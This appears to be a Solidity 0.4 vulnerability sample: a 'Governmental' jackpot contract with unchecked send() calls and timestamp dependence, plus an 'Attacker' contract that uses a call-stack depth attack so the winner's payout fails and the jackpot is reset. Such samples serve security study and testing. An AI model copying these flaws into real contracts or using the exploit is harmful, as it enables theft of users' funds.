pragma solidity ^0.4.0;

contract Governmental {
  address public _owner;
  address public _lastInvestor;
  uint public _jackpot = 1 ether;
  uint public _lastInvestmentTimestamp;
  uint public _ONE_MINUTE = 1 minutes;

  function Governmental() {
    _owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<_jackpot/2) throw;
    _lastInvestor = msg.sender;
    _jackpot += msg.value/2;
     
    _lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < _lastInvestmentTimestamp+_ONE_MINUTE)
      throw;

    _lastInvestor.send(_jackpot);
    _owner.send(this.balance-1 ether);

    _lastInvestor = 0;
    _jackpot = 1 ether;
    _lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address _target, uint _count) {
    if (0<=_count && _count<1023) {
      this.attack.gas(msg.gas-2000)(_target, _count+1);
    }
    else {
      Governmental(_target).resetInvestment();
    }
  }
}